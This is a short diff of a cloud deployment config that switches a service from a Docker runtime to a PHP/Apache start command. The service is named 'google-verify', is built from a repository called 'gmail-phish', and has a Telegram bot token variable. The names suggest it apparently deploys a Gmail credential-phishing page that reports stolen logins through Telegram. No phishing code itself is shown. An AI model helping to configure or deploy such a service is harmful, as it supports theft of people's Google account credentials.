@@ -1,9 +1,10 @@
 services:
   - type: web
     name: google-verify
-    runtime: docker
+    runtime: php
     repo: https://github.com/davidmassmutual/gmail-phish.git
-    dockerfilePath: ./Dockerfile
+    buildCommand: "echo 'No build needed'"
+    startCommand: "apache2-foreground"
     envVars:
       - key: TELEGRAM_BOT_TOKEN
         sync: false
